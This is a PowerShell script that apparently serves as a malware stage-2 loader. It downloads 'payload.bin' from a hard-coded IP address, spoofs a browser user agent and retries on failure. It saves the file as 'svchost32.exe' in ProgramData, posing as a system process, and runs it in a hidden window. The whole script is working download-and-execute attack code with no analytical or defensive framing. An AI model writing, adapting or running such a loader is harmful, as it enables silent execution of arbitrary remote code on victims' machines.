[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://198.51.100.13/downloads/payload.bin",
    [string]$LocalPath = "C:\ProgramData\svchost32.exe",
    [string]$ActivityLog = "$env:TEMP\stage.log",
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$TransferTimeout = 29,
    [int]$MaxAttempts = 3,
    [int]$BackoffSeconds = 4
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$RetryCount = 3,
        [int]$RetryDelay = 4,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $RemoteUrl
    $StageResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $LocalPath -RetryCount $MaxAttempts -RetryDelay $BackoffSeconds -UserAgent $RequestAgent
    if ($StageResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $LocalPath -WindowStyle Hidden
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $RemoteUrl
    Destination = $LocalPath
    RetryCount = $MaxAttempts
    TimeoutSec = $TransferTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Starting workflow"
Write-Verbose "Reading configuration values"
Write-Verbose "Stage handoff finished"
Write-Verbose "Operation completed"
Write-Verbose "Checking local path"
Write-Verbose "Inspecting process list"
Write-Verbose "Collecting host metadata"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
